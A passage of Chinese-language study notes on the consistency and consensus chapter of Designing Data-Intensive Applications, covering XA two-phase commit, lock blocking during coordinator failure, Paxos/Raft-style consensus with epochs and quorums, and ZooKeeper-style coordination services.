<li>AP (Application Program)：应用程序，通过定义组成事务的特定操作来定义事务边界。</li>
<li>RM (Resouces Manager)：资源管理器，管理共享资源的服务，对应两阶段提交协议中的参与者，如数据库或消息队列服务。</li>
<li>TM (Transaction Manager)：事务管理器，管理全局事务，协调事务的提交或者回滚，并协调故障恢复。</li>
</ul>
</blockquote>
<p><mark style="background: #BBFABBA6;">使用事务的<strong>应用层</strong>会以网络驱动（network driver）或者客户端库（client library）来使用 XA 的 API 与参与者服务（数据库或者消息队列）进行交互</mark>。如果驱动程序支持 XA 协议，则意味着应用侧可以调用 XA 的 API 来确定一个操作是否是分布式事务的一部分（即通过 XA 定义的接口来确定事务所涵盖<strong>操作的边界</strong>）；如果是，则会发送必要的消息给参与者。XA 驱动也提供了一些回调，协调者可以使用这些回调要求参与者进行准备、提交或者中止。</p>
<p>事务的<strong>协调者</strong>实现了 XA API。<mark style="background: #FFF3A3A6;">XA 的标椎并没规定协调者该如何实现，并且在实践中协调者通常以<strong>库的形式</strong>被加载进应用程序中（作为应用程序的一部分，而非额外单独的一个服务）</mark>。它会追踪事务中的所有参与者，在要求参与者准备提交（prepare）后收集其回复，使用本地磁盘上的日志来跟踪每个事务的<strong>提交 / 中止</strong>决策。</p>
<p>如果应用进程崩溃、或者应用所在机器宕机，协调者也会随之而宕机。所有已经进行过提前准备过，但未真正提交的事务（未定事务）无疑会阻塞住。<mark style="background: #FFF3A3A6;">由于协调者的日志在应用程序的本地磁盘里，则该服务器必须能够重启，从而让协调者库能够读取磁盘上的日志，以恢复之前所做提交或中止的决策</mark>。据此，协调者才可以使用 XA 协议的回调，要求所有参与者提交或者中止。数据服务器不能直接和协调者进行通信，所有的通信必须要通过客户端的 XA 库。</p>
<h4 id="阻塞时持有锁"><strong>阻塞时持有锁</strong></h4>
<p>为什么我们这么关心事务的参与者在<strong>未定状态</strong>时卡住呢？系统的其他部分不能够无视该未定事务而继续干自己的事情吗？反正该未定事务最终会被处理。</p>
<p>问题的关键点在于存在<strong>锁</strong>（locking）。在<a href="https://ddia.qtmuniao.com/#/ch07?id=%e8%af%bb%e5%b7%b2%e6%8f%90%e4%ba%a4"><strong>读已提交</strong></a>一小节中，数据库中的事务通常会使用行级别的互斥锁来保护对某一行的修改，以防止脏写。更进一步，如果想获得可串行化隔离级别，数据库在使用两阶段锁进行实现时，会对事务所有读过的行加共享锁（参见<a href="https://ddia.qtmuniao.com/#/ch07?id=%e4%b8%a4%e9%98%b6%e6%ae%b5%e9%94%81"><strong>两阶段锁</strong></a>）。</p>
<p><mark style="background: #FF5582A6;">数据库在提交或者中止事务前<strong>不能够释放获取的这些锁</strong>。因此，在使用两阶段提交时，一个事务必须在其处于未定状态期间一直持有锁</mark>。如果协调者在宕机后花了 20 分钟才重新启动起来，则对应参与者的锁就要持有 20 分钟。如果参与者日志由于某种原因丢掉了，这些锁会被永远的持有 —— 除非系统管理员会手动释放它们。</p>
<p>如果这些锁一直被持有，则其他事务不能够更改这些数据。取决于数据库的实现，有些事务甚至会在读这些行的数据是被阻塞。因此，其他的事务并不能正常的运行 —— 如果他们要访问这些上锁的数据，就会被阻塞。这会造成应用的大部分功能不可用，直到未定事务被解决。</p>
<h4 id="从协调者故障中恢复"><strong>从协调者故障中恢复</strong></h4>
<p>理论上来说，如果协调者宕机重启后，就能够从日志读取之前决策，从而处理还在存疑的参与者事务。然而，在实践中，常会产生一些孤立的（orphaned）未定事务 —— 即，<mark style="background: #FFF3A3A6;">由于某种原因，<strong>事务的协调者</strong>（比如由于软件 bug 事务日志丢失或者损坏）<strong>无从判断事务的最终结果是提交还是回滚</strong></mark>。由是，这些事务不能够被自动的处理，从而永久的卡在那里，持有锁并且阻塞其他事务。</p>
<p>即使重启数据库服务器也不能让其从卡住中恢复，在一个正确实现的 2PC 系统中，参与者在重启后必须仍然持有事务相关锁（否则就会违反其承诺，进而原子性保证），这是一种非常棘手的情况。</p>
<p>唯一的出路是让管理员手动的来提交或者中止事务。管理员首先需要检查所有包含未定事务的参与者，看是否有任何参与者提交或者中止了，从而对其他卡主的参与者手动执行相同操作（<strong>通过外力来让所有参与者达成一致</strong>）。解决该问题需要大量手工操作，并且在线上环境中断服务的巨大压力和时间限制下（不然，为什么协调者会处在此种错误状态下？）。</p>
<p>很多 XA 事务的实现会留有紧急后门，称为<strong>启发式决策</strong>（<em>heuristic decisions</em>）：允许一个参与者不用等待协调者的决策，而<strong>单方面</strong>决定中止还是提交一个未定事务。需要说明的是，这里的<mark style="background: #FF5582A6;">启发式仅仅是<strong>可能打破原子性</strong>（probably breaking atomicity）的一种委婉说法</mark>。因为这么做可能会违反两阶段提交所提供的保证。因此这种启发式决策仅是为了救急，而不能进行日常使用。</p>
<h4 id="分布式事务的限制"><strong>分布式事务的限制</strong></h4>
<p>XA 事务解决了一些很现实而重要的难题：让异构的数据系统保持一致。但正如所见，它也引入了一些重大的运维难点。具体来说，引入这些难点的核心原因在于 —— 从某种角度看，<strong>事务的协调者也是一个 “数据库”</strong>（事务决策结果得存在里面）。因此，也需要像其他数据库一样小心谨慎地进行对待：</p>
<ul>
<li><mark style="background: #FF5582A6;">协调者可能单点故障</mark>。如果协调者没有使用多副本机制，仅运行在一台机器上，则它会成为系统的一个<strong>单点</strong>（因为它的宕机会造成存疑的参与者，进而阻塞其他应用服务的继续运行）。然而，令人惊讶的是，很多协调者的实现要么默认不是高可用的，要么只提供了很粗糙的冗余支持。</li>
<li><mark style="background: #FFF3A3A6;">应用服务变为有状态的</mark>。很多服务端应用本身被设计为<strong>无状态的</strong>（stateless，HTTP 比较偏好无状态，如 Restful 设计风格）的，然后将状态都外存到数据库中。这样做的好处是，应用侧进程可以随意增删，按需扩展和收缩。但如果事务的协调者成为了应用层的一部分，就改变了这个本质设定。协调者的日志变成了应用层一个至关重要的、需要持久化的状态 —— 需要像数据库一样按同等重要性对待。因为在宕机重启后，参与者会利用这些日志来推进卡住的参与者。由是，应用层不再是无状态的。</li>
<li>由于 XA 需要和足够广泛的数据系统进行适配，因此其 API 只能维持一个<strong>最小公共接口集</strong>，由此带来了 XA 在能力上的<strong>诸多限制</strong>。如，XA 不能在跨系统检测死锁，因为这要求增加一种可以获取所有正在等待的锁信息接口（需要使用 Wait-For-Graph 死锁检测）；XA 也不能提供跨系统的 SSI 隔离级别（参见<a href="https://ddia.qtmuniao.com/#/ch07?id=%e5%8f%af%e4%b8%b2%e8%a1%8c%e7%9a%84%e5%bf%ab%e7%85%a7%e9%9a%94%e7%a6%bb"><strong>可串行的快照隔离</strong></a>），因为这要求支持一种可以跨系统监测冲突的协议（SSI 要在 SI 的基础上进行读写冲突检测）。</li>
<li>对于数据库的<strong>内部分布式事务</strong>（非 XA），就没有这些限制 —— 例如，可以提供分布式版本的 SSI。然而，要成功地提交一个 2PC 事务仍有诸多问题：所有的参与者必须要回复（但可以异步回应）。因此，一旦系统内任何子模块损坏了，则事务也随之失败。从这个角度来说，分布式事务有<strong>放大故障</strong>的嫌疑，这与我们构建容错系统的目标背道而驰（这就是 tradeoff，为上层提供的更多的一致性保证，就会牺牲性能，降低可用性）。</li>
</ul>
<p>上述事实是否意味着我们应该放弃让不同系统保持一致的努力？不尽然，有很多其他方法，既可以让我们达到同样的目标，而又不必引入异构分布式事务的痛点。我们在第 11 章和 12 章会回到对这个问题的讨论。现在让我们先把共识问题这个主题讲完。</p>
<h3 id="容错的共识算法"><strong>容错的共识算法</strong></h3>
<p>通俗来说，共识（consensus）意味着让<strong>多个节点就某件事情达成一致</strong>。比如说，如果多个人同时抢某次航班的最后一张票、预定剧院里的同一个座位或者使用同一个用户名注册账号，则可以使用共识协议来判断这些互斥的操作中，谁是真正的赢家（这其实利用了之前提到的可线性化）。</p>
<p>形式化一些，共识协议通常被描述为：<mark style="background: #BBFABBA6;">一个或者多个节点可能会各自<strong>提议</strong>（propose）一些值，共识协议需要在这些值中间做出唯一的<strong>决策</strong>（decide）</mark>。在预定座位的例子中，当多个客户试图并发地获取最后一个座位时，每个处理用户请求的节点会提议一个其所处理的用户 ID，然后最终决策对应着哪个用户会得到该作为。</p>
<p>在这种形式化表述中，一个共识协议必须满足以下条件：</p>
<ul>
<li><strong>全局一致性</strong>（<em>Uniform agreement</em>） 没有任何两个节点最终做出不同决策</li>
<li><strong>正直性</strong>（<em>Integrity</em>） 没有任何节点会做出两次决策（不会反复横跳）</li>
<li><strong>有效性</strong>（<em>Validity</em>） 如果一个节点做出了决策，该决策所对应的值一定来自系统内某个节点的提议</li>
<li><strong>可终止性</strong>（<em>Termination</em>） 任何没有宕机的节点，最终都会给出对某个值的决策</li>
</ul>
<p>全局一致和正直性定义了共识协议的核心概念：<strong><mark style="background: #FFF3A3A6;">所有节点都要决策出同样的结果，并且一旦做出决策，就不能反悔</mark></strong>。加入有效性更多的是为了排除一些无效（trivial）结果：如果无论其他节点提议什么，一个算法都会选择 null 作为决策值；该算法虽然满足一致性和正直性约束，但却不满足有效性。</p>
<p><mark style="background: #FFF3A3A6;">如果<strong>不关心容错性，则仅满足前三个性质就足够</strong>了：比如，可以通过硬编码指定某个节点为 “独裁者”，并且让其做所有决策，其他节点只要服从即可</mark>。然而，一旦该节点故障，则整个系统不能继续决策和推进。事实上，这正是我们在两阶段提交算法中看到的：一旦协调者故障，所有处于未定状态的参与者都无法独自决策是提交还是中止。</p>
<p><strong>可终止性是对容错的一种形式化描述</strong>（从结果来描述）。它本质上是在说，一个共识算法不能让系统陷入一种卡在那、啥也不干，直到永远的状态。换句话说，<mark style="background: #FFF3A3A6;">系统必须能够正常运作，即使有些节点宕机，其他节点也必须能够继续做出决策</mark>。（可结束性是存活性，liveness，而其他三个性质是安全性，safety，参见<a href="https://ddia.qtmuniao.com/#/ch08?id=%e5%ae%89%e5%85%a8%e6%80%a7%e5%92%8c%e5%ad%98%e6%b4%bb%e6%80%a7"><strong>安全性和存活性</strong></a>&nbsp;）。</p>
<p>该模型对节点宕机做了最坏的假设 —— <strong>一旦节点宕机，就会凭空消失，再也不会回来</strong>。适用于该模型的场景不是软件故障造成的宕机，而是由火山喷发、地震等造成的数据中心不可逆转的损坏。在该系统模型下，任何需要等待节点回复的算法都不可能满足可终止性。具体来说，在这种设定下，<mark style="background: #FF5582A6;">2PC 就不满足可结束性要求</mark>。</p>
<p>当然，如果所有节点都宕机，则任何算法都不可能做出任何决策。共识算法有其能够承受的宕机节点数上限：事实上，可以证明，<mark style="background: #FFF3A3A6;">任何共识算法都要求<strong>多数节点存活</strong>，以确保正常运行，满足可终止性</mark>。多数派节点可以安全的构成一个<strong>法定多数</strong>（quorum，参见 <a href="https://ddia.qtmuniao.com/#/ch05?id=quorum-%e8%af%bb%e5%86%99"><strong>Quorum 读写</strong></a>）。</p>
<p>因此，可终止性受限于少于半数节点宕机或不可达的假设。然而，大多数共识算法的实现在大多数节点都宕机或者网络出现大范围故障时仍然能保持安全性 —— 一致性，正直性和有效性。也即，大范围的节点下线可能会让系统<strong>不能继续处理请求</strong>，但<strong>不会因此破坏共识协议</strong>，让其做出不合法决策。</p>
<p><mark style="background: #FFF3A3A6;">大多数共识算法会假设系统中<strong>不存在拜占庭故障</strong></mark>（参见<a href="https://ddia.qtmuniao.com/#/ch08?id=%e6%8b%9c%e5%8d%a0%e5%ba%ad%e9%94%99%e8%af%af"><strong>拜占庭错误</strong></a>）。即如果某些节点故意不遵守协议（例如，对不同节点返回完全不同的信息），就有可能破坏协议的安全性。当然，我们也有办法让系统足够鲁棒以容忍拜占庭错误，但就得要求集群中不能有超过三分之一的恶意节点（具有拜占庭错误的节点），但本书中没有足够精力来详细讨论这种算法的细节了。</p>
<h4 id="全序广播中的共识算法">全序广播中的共识算法</h4>
<p>最广为人知的容错性的共识算法有 ——VSR（Viewstamped Replication）、Paxos、Raft 和 Zab。<mark style="background: #BBFABBA6;">这些共识算法间有非常多的共同点，但他们确实不完全相同</mark>（虽然 Lamport 说过类似，世界上只有一种共识算法 ——Paxos）。在本书中我们不会探究每个共识算法的区别的所有细节：只需知道他们在顶层设计中有很多相似之处即可。除非，你想自己实现一个共识算法。</p>
<blockquote>
<p>当然，并不推荐这么做，因为实现一个工业级可用的共识算法很难，需要处理特别多的边角情况，而这些情况不经过大量实践是根本不会想到的。虽然 TLA 可以验证你的算法，但并不能验证你的实现。</p>
</blockquote>
<p>这些共识算法通常不会直接按上述形式化的定义（如提议并在<strong>单值上</strong>进行决策，同时满足一致性、正直性，有效性和可终止性）来实现。转而，他们通常会在<strong>一系列值</strong>上做出决策，从而事实上变成一种<strong>全序广播算法</strong>，本章前面小节讨论过这个问题。</p>
<p><mark style="background: #BBFABBA6;">全序广播等价于多轮次的共识协议</mark>（每个轮次，会使用共识协议对全序广播中的一条<strong>消息</strong>的全局顺序做出决策）：</p>
<ul>
<li>由于共识协议的全局一致性，所有节点会以同样的顺序投递同样的消息。</li>
<li>由于正直性，具有同样 id 的消息不会重复。</li>
<li>由于有效性，消息不会是损坏的，也不会是凭空捏造的。</li>
<li>由于可终止性，消息不会丢失。</li>
</ul>
<p>VSR，Raft 和 Zab 都直接实现了全序广播，相对多次使用共识算法，每次就单个只达成一致，这种方法要更高效。对于 Paxos，其全序广播版本是 Multi-Paxos。</p>
<h4 id="单主复制和共识协议">单主复制和共识协议</h4>
<p>在第五章，我们讨论了基于单主模型的复制协议（参见<a href="https://ddia.qtmuniao.com/#/ch05?id=%e9%a2%86%e5%af%bc%e8%80%85%e4%b8%8e%e8%b7%9f%e9%9a%8f%e8%80%85">领导者与跟随者</a>），在该模型中，主节点会接管所有写入，并且以同样的顺序复制给从节点，以此保持所有副本的数据一致。这本质上不也是全序广播么？为什么我们在第五章不需要考虑共识问题呢？</p>
<p>该问题的核心点在于<strong><mark style="background: #FFF3A3A6;">主节点（领导者）是怎样选出的</mark></strong>。如果主节点由运维团队的管理员手动配置，你本质上就获得了一个 “共识算法” 的独裁变种：只有一个节点允许接受写入（决定复制日志中所有日志的顺序），并且一旦该主节点宕机，系统便会陷入不可用的状态，直到运维人员手动的配置另外一个节点为主节点。这样的系统在实践中也可以正常运作，但是并不满足共识算法中的可终止性，因为它在停顿后要求运维人员的干预，才能继续运转。</p>
<p>有些数据库在遇到主节点故障时，会自动地重新进行主选举，将一个从节点提升为新的主节点（参见<a href="https://ddia.qtmuniao.com/#/ch05?id=%e5%ae%95%e6%9c%ba%e5%a4%84%e7%90%86">宕机处理</a>）。这就让我们进一步逼近了可容错的全序广播，并且解决了共识问题。</p>
<p>但，<strong>这中间有个循环依赖的问题</strong>。我们之前讨论了脑裂（split brain）问题，并且断言所有的节点必须就谁是领导者达成一致 —— 否则，如果有两个不同节点都认为自己是领导者，则会有多个写入点，进而让数据库陷入不一致的状态。因此，我们需要共识算法来进行选主。但我们说共识算法本质上可以描述为全序广播算法，然后全序广播算法又和单主复制一样，然后单主复制又依赖时刻保证单个主，然后…</p>
<p>看起来，为了选出单个主节点，我们首先需要一个主节点；为了解决共识问题，我们首先要有一个共识算法；我们如何打破这个循环依赖呢？</p>
<h4 id="纪元编号和法定人数">纪元编号和法定人数</h4>
<p>到目前为止所提到的共识算法都在内部需要一个<strong>某种形式上</strong>的主节点，但都不能保证主节点是唯一的。但，他们可以给出一个稍弱的保证：协议会定义一个<strong>纪元编号</strong>（epoch number；在 Paxos 中称为<strong>投票编号</strong>，ballot number；在 Viewstamp Replication 中称为<strong>视图编号</strong>，view number；在 Raft 中称为<strong>任期编号</strong>，term number），并且<mark style="background: #BBFABBA6;">保证在每一个纪元（epoch）内，主节点是唯一的</mark>。</p>
<p>每次当前的主节点被认为下线时（可能是宕机，也可能只是网络不通），所有认为该主下线的节点就会发起选举，以选出新的主节点。每次选举会使用一个更高的纪元编号，因此所有的纪元编号是全序且单调递增的。<mark style="background: #FFF3A3A6;">如果不同纪元中有两个节点都认为自己是主（比如之前的主节点并没有宕机），则具有较高纪元编号的主节点胜出</mark>。</p>
<p>在一个主节点被授权做任何事之前，它必须要确认不会有更权威的主节点（具有更高的纪元编号）会做出不同决策。那该一个主节点如何知道自己没有被其他节点 “赶下台” 呢？会议一下，我们在<a href="https://ddia.qtmuniao.com/#/ch08?id=%e7%9c%9f%e7%9b%b8%e7%94%b1%e5%a4%9a%e6%95%b0%e6%b4%be%e5%ae%9a%e4%b9%89">真相由多数派定义</a>一节中讨论过的：分布式系统中，一个节点不能无脑相信自己的判断 —— 因为<strong>一个节点认为自己是主，不意味着其他节点也都认可这一点</strong>。</p>
<p>因此，主节点在决策前需要首先从所有节点获得法定票数（参见 <a href="https://ddia.qtmuniao.com/#/ch05?id=quorum-%e8%af%bb%e5%86%99">Quorum 读写</a>）。<mark style="background: #BBFABBA6;">对于每个决策，主节点都必须将其作为提案发给其他所有节点，并且等待法定节点的同意</mark>。法定节点通常来说，会包含多数派节点，但也不绝对（<a href="https://arxiv.org/abs/1608.06696">Flexible Paxos</a> 介绍了一种不需要多数节点的放宽的 Paxos 算法）。如果法定节点的回复中没有任何更高纪元的，则当前主节点可以放心的认为没有发生新纪元的主选举，并可以据此认为他仍然 “握有领导权”。从而，可以安全的对提案进行决策。</p>
<p>该投票过程非常像两阶段提交提交算法。最大的区别在于：</p>
<ol type="1">
<li>2PC 中的协调者不是被选出来的。</li>
<li><mark style="background: #FFF3A3A6;">2PC 要求每一个参与者都回复 “可以”，而可容错的共识算法只要求多数节点的投票。</mark></li>
</ol>
<p>此外，共识算法在新领导者上台时，针对数据不一致的节点，还设计了一套恢复策略。这些不同点是共识算法能够保证<strong>正确性</strong>和<strong>容错性</strong>的核心设计。</p>
<h4 id="共识算法的局限性">共识算法的局限性</h4>
<p>共识算法对于分布式系统是一个划时代的突破：他们能够在不确定的环境里保证<strong>安全性</strong>（一致性、正直性和有效性），在此基础上还能够进行<strong>容错</strong>（只要大多数节点还活着就能正常运转）。他们还实现了全序广播，因此能够用来实现容错的线性一致的系统。</p>
<p>然而，共识算法并非银弹，因为这些收益都是有代价的。</p>
<p><strong><mark style="background: #FF5582A6;">同步复制损失性能</mark></strong>。每次进行决策（更改数据）前都要让多数节点进行投票，意味着这是一个同步复制系统。在<a href="https://ddia.qtmuniao.com/#/ch05?id=%e5%90%8c%e6%ad%a5%e5%a4%8d%e5%88%b6%e5%92%8c%e5%bc%82%e6%ad%a5%e5%a4%8d%e5%88%b6">同步复制和异步复制</a>一节中我们讲过，很多数据库都会配置为异步复制。在这种配置下，有些已经提交的数据在进行恢复时可能会丢失，但很多人仍然选择这种模式 —— 承担这种风险，以换取更好的性能。</p>
<p><strong>多数派会增加系统冗余</strong>。共识系统总是要求有<strong>严格多数节点</strong>存活才能正常运行。这意味着，如果你要容忍单节点故障就至少需要三个节点（三节点中的两个节点可以组成多数派），如果要容忍两个节点故障就至少需要五个节点（五个节点中的三个节点组成多数派）。如果网络故障切断了其中一些节点和其他节点的联系，则只有连通的多数派节点可以正常运行，其他节点都会被阻塞。</p>
<p><strong><mark style="background: #FFF3A3A6;">动态成员扩展复杂</mark></strong>。很多共识算法会假定有固定的数目节点参与投票，这意味着你不能往集群中增删节点。共识算法的<strong>动态成员变更</strong>（dynamic membership）扩展允许集群的节点集随时间推移而发生变动，但相对于静态成员算法，这种扩展版本非常难以理解。</p>
<p><strong>复杂网络环境性能很差</strong>。共识系统通常通过超时机制来对故障节点进行检测。在延迟高度变化的网络中，尤其是多地部署的分布式系统中，某些存活节点由于网络的瞬时抖动常被误认为发生了故障。尽管这些问题并不会破坏安全性，但频繁的领导者选举会导致极差的性能表现 —— 系统可能会大部分时间都在选主而不是正常干活上。</p>
<p>有时，<strong><mark style="background: #FF5582A6;">共识算法对网络故障非常敏感</mark></strong>。例如， Raft 对某些边角情况处理的不尽如人意：如果整个网络都正常运行，只有某个特定的网络连接持续的抖动。Raft 会进行在两个节点间频繁切主，或者当前主节点的领导权被不断挑战，则系统不再能有效的运转，对外提供服务（这里存疑，通过预投票，pre-vote 应该可以解决这个问题）。其他共识算法也有类似的问题，针对不可靠网络设计更为鲁棒的共识算法仍是一个正在持续研究的课题。</p>
<h3 id="成员关系和协调服务">成员关系和协调服务</h3>
<p>类似于 Zookeeper 和 etcd 的项目，经常被描述为 “分布式 KV 存储” 或者 “协调和配置服务”。这些系统的 API 看起来也非常像数据库：</p>
<ol type="1">
<li>你可以读取或者写入给定 key 的 value</li>
<li> 你也可以遍历一组 keys</li>
</ol>
<p>如果这些系统本质上是数据库，为什么它们要费这么大力气实现共识算法呢？到底是什么让他们区别于一般意义上的数据库？</p>
<p>为了弄清该问题的答案，我们需要简单的探讨下<strong>如何使用类似 Zookeeper 这样的服务</strong>。作为一个应用开发者，你很少直接使用 Zookeeper，因为它并不能作为通常意义上的数据库而直接被应用层使用。它更像是一种你在使用其他项目时间接依赖：例如，Hbase，Hadoop YARN，OpenStack Nove 和 Kafka 都在背后依赖了 Zookeeper。这些项目到底依赖 Zookeeper 的什么呢？</p>
<p><mark style="background: #FFF3A3A6;">Zookeeper 和 etcd 设计目标为<strong>存储小尺度的数据</strong></mark>，比如能装进内存里的（但在这些系统里，数据还是会落盘的）—— 因此你不能期望把所有应用层数据都存进这些系统里。这些系统<mark style="background: #BBFABBA6;">使用可容错的全序广播算法，将小尺寸的数据被复制到所有节点上</mark>。如前所述，我们做数据库复制的时候真正需要的东西其实是全序广播：如果每条消息代表针对数据库的一个修改，以相同的顺序对所有副本应用相同的改动，能够将数据库保持在一致的状态。</p>
<p>Zookeeper 是模仿 Google 的 Chunk 锁服务实现的，不仅实现了全序广播算法（进而实现了共识），也实现了其他一些对分布式系统非常有用的功能集：</p>
<ul>
<li><strong>线性化的原子操作（lock）</strong>。&nbsp; 使用原子的 CAS 操作，可以实现锁：如果多个节点并发执行同一个操作，只有一个会成功。<mark style="background: #BBFABBA6;">共识协议能够保证，即使随时可能出现节点宕机或者网络故障，操作仍然是原子和线性化的</mark>。一个分布式锁通常实现为具有<strong>过期时间的 “租约”</strong>（lease），这样即使客户端宕机，锁也能够被最终释放。</li>
<li><strong>操作的全序保证（zxid）</strong>&nbsp; 。在<a href="https://ddia.qtmuniao.com/#/ch08?id=%e9%a2%86%e5%af%bc%e8%80%85%e5%92%8c%e9%94%81">领导者和锁</a>一节中我们讨论过，当某个资源被锁或者租约保护时，你需要<strong>防护令牌机制</strong>来防止由于进程停顿而造成的加锁冲突。防护令牌一个在每次获取锁都会单调自增的数值。Zookeeper 通过给每个操作赋予一个全局自增的事务 id（zxid）和一个版本号（cversion）来提供该功能。</li>
<li><strong>故障检测（ephemeral node）</strong>&nbsp;。 <mark style="background: #FFF3A3A6;">客户端和 ZooKeeper 的服务器间维持着一个长会话，客户端和服务端通过周期性的心跳来检测对端是否仍然存活</mark>。即使该连接短暂断掉，或者 ZooKeeper 节点故障，该会话仍然能够存活。但如果，心跳停顿间隔过长，超过了会话的超时阈值，ZooKeeper 会标记该会话死亡。所有该会话关联的锁在超时都将会被释放（ZooKeeper 将其称为<strong>暂态节点</strong>，ephemeral nodes，这类节点可以将生命周期与会话进行绑定）。</li>
<li><strong>变动通知（watch）</strong>&nbsp; 。客户端不仅可以读取其他节点创建的锁或者值，也可以直接对这些对象的变化进行<strong>监听</strong>（watch）。通过监听机制，客户端可以立即发现是否有其他客户端加入集群（通过这些客户端写入 ZooKeeper 的值）、其他客户端是否故障（通过这些客户端注册到 ZooKeeper 中的暂态节点的消失）。<mark style="background: #BBFABBA6;">通过订阅这些通知，客户端可以避免频繁地去 ZooKeeper 拉取信息，比对以确定是否发生了某些变化</mark>。</li>
</ul>
<p>对于这些功能，<mark style="background: #FFF3A3A6;">只有线性化的原子操作真正需要共识算法</mark>。但这些操作的组合，使得类似 ZooKeeper 的系统对分布式系统非常有用。</p>
<h4 id="为节点分配任务">为节点分配任务</h4>
<p>另一种 ZooKeeper/Chubby 非常适用的场景是选主，假设你有多个进程或服务，其中一个被选为领导者或者主服务。如果领导者故障，则另外一个节点需要接管。这不仅对于单主模型的系统非常重要，对于<strong>任务调度器</strong>或其他类似<strong>有状态服务</strong>来说，该功能也十分有用。</p>
<p>另一个例子是，你有一些分了片的资源（数据库、消息流、文件存储、分布式的 actor 等等），并且需要决策<mark style="background: #FFF3A3A6;">哪些分片要放到哪些节点上去</mark>。当新节点加入集群后，一些分片需要从现有节点挪动到这些新节点上去，以进行<strong>负载均衡</strong>。当有节点故障或者被移除时，其他的节点需要接管故障节点的负载。</p>
<p>可以通过谨慎的组合使用 ZooKeeper 中的原子操作、暂态节点和通知机制来实现这类任务。如果实现正确，则可以让应用在遇到故障时，无人工干预的情况下自动恢复。即使有很多基于 ZooKeeper 的二次封装库（如 Apache Curator）可以借助，实现正确仍然不容易。但总好过从头实现所需的共识算法，很少有人能够成功的从头实现一个工业可用的共识系统。</p>
<p>刚开始时，一个应用可能会运行在单机上，但最终可能会扩展到上千节点的集群上。在如此多的节点上进行多数票选举会非常低效。相反，ZooKeeper 通常运行在固定节点的集群上（通常是三个或者五个），并且只须在这几个节点间达成共识，然后就可以支持非常多的客户端访问。这样，ZooKeeper 提供了一种可以将<strong>部分功能</strong>（共识算法、外包定序、故障检测）“<strong>外包</strong>”（outsouring）给外部服务的方法。</p>
<p>通常来说，<mark style="background: #FFF3A3A6;">ZooKeeper 所管理的数据只会<strong>很低频的改变</strong></mark>：比如它会维护类似 “运行在 10.1.1.23 节点上的服务是分片 7 的领导者” 的元信息，这种信息只会在<strong>分钟或者小时级</strong>的时间尺度上进行改变。<mark style="background: #BBFABBA6;">这些系统不是为了存储应用运行时的数据</mark>，毕竟这些数据可能会以上千甚至上百万 QPS 的速率被修改。如果应用需要将数据从一个节点同步到另外一个节点，则需要使用其他工具（如 Apache 的 BookKeeper，一个类似于日志的存储服务，会将 log 切分并做冗余，Pulsar 的存储层在用）。</p>
<h4 id="服务发现">服务发现</h4>
<p>ZooKeeper，etcd 和 Consul 也会用于<strong>服务发现</strong>（service discovery）—— 即根据服务名称找到其对应的 IP 地址以进行连接。在数据中心的环境中，虚拟机的来来去去非常普遍，因此很难事先知道某个服务的 IP 地址。因此，你可以对服务进行配置，让其在启动的时候在<strong>某个服务</strong>（通常是名字服务器，nameserver）注册自己的地址和端口，其他人就能使用名字来找到该服务的最终地址。</p>
<p>然而，<mark style="background: #FFF3A3A6;">服务发现是否真的需要共识协议暂时存疑</mark>。传统上，人们使用 DNS 服务来通过服务名找到其对应 IP 地址。DNS 通常使用多级缓存来获取高性能和高可用性。从 DNS 读取信息肯定不满足线性一致性，而且从 DNS 中偶尔读到过期的结果通常问题不大。<mark style="background: #BBFABBA6;">对于服务发现，相比线性一致性，<strong>高可用性和对网络的健壮性</strong>才是更重要的</mark>。</p>
<p>尽管服务发现不需要共识协议，但领导者选举需要。因此，如果你的共识系统已经知道领导者是谁，他就可以利用这些信息帮助别的服务来发现谁是领导者。出于这种目的，一些共识系统支持<strong>只读的缓存副本</strong>（如 Raft 中的 learner）。这些副本从共识协议中异步的接收数据，但并不参与投票。因此可以提供不在意线性一致性的读取。</p>
<h4 id="成员服务">成员服务</h4>
<p>ZooKeeper 及类似服务可以视为<strong>成员服务</strong>（membership services）研究范畴的一部分，该研究可以上溯到上世纪八十年代，对于构建高可用系统非常重要，如空中交管系统。</p>
<p>成员服务可以<mark style="background: #FFF3A3A6;">确定当前<strong>集群中哪些节点当前是存活的</strong></mark>。如第八章中所说，在具有无界延迟的网络中，不可能可靠的检测出一个节点是否故障。然而，如果你综合使用故障检测和共识算法，所有节点能够对哪些节点存活这件事达成共识。</p>
<p>使用共识协议也有可能错将一个节点认为下线了，尽管它事实上是存活的。但尽管如此，<mark style="background: #BBFABBA6;">只要系统能够对当前系统包含哪些节点达成共识，就仍然很有用处</mark>。例如，选主算法可以是 —— 在系统当前所有节点中选一个具有最小标号的节点。如果所有节点对系统当前包含哪些节点存在分歧，则这种方法就不能正常工作（不同节点眼中的的最小编号节点可能不一致，从而让大家选出的主不一致）。</p>
<h2 id="本章小结">本章小结</h2>
<p>在本章中，我们从几个不同的角度审视了关于一致性与共识的话题。我们深入研究了线性一致性（一种流行的一致性模型）：其目标是<mark style="background: #BBFABBA6;">使多副本数据看起来好像只有一个副本一样，并使其上所有操作都原子性地生效</mark>。</p>
<ul>
<li>虽然线性一致性因为简单易懂而很吸引人 —— 它使数据库表现的好像单线程程序中的一个变量一样</li>
<li>但它有着速度缓慢的缺点，特别是在网络延迟很大的环境中。</li>
</ul>
<p>我们还探讨了因果性，因果性对系统中的事件施加了顺序（什么发生在什么之前，基于因与果）。与线性一致不同，线性一致性将所有操作放在单一的全序时间线中，因果一致性为我们提供了一个较弱的一致性模型：某些事件可以是 &nbsp;<strong>并发</strong>&nbsp; 的，所以版本历史就像是一条不断分叉与合并的时间线。<mark style="background: #BBFABBA6;">因果一致性没有线性一致性的协调开销，而且对网络问题的敏感性要低得多。</mark></p>
<p>但即使捕获到因果顺序（例如使用兰伯特时间戳），我们发现有些事情也不能通过这种方式实现：在 “<a href="http://ddia.vonng.com/#/ch9?id=%e5%85%89%e6%9c%89%e6%97%b6%e9%97%b4%e6%88%b3%e6%8e%92%e5%ba%8f%e8%bf%98%e4%b8%8d%e5%a4%9f">光有时间戳排序还不够</a>” 一节的例子中，我们需要确保用户名是唯一的，并拒绝同一用户名的其他并发注册。如果一个节点要通过注册，则需要知道其他的节点没有在并发抢注同一用户名的过程中。这个问题引领我们走向 &nbsp;<strong>共识</strong>。</p>
<p>我们看到，达成共识意味着以这样一种方式决定某件事：所有节点一致同意所做决定，且这一决定不可撤销。通过深入挖掘，结果我们发现很广泛的一系列问题实际上都可以归结为共识问题，并且彼此等价（从这个意义上来讲，如果你有其中之一的解决方案，就可以轻易将它转换为其他问题的解决方案）。这些等价的问题包括：</p>
<ul>
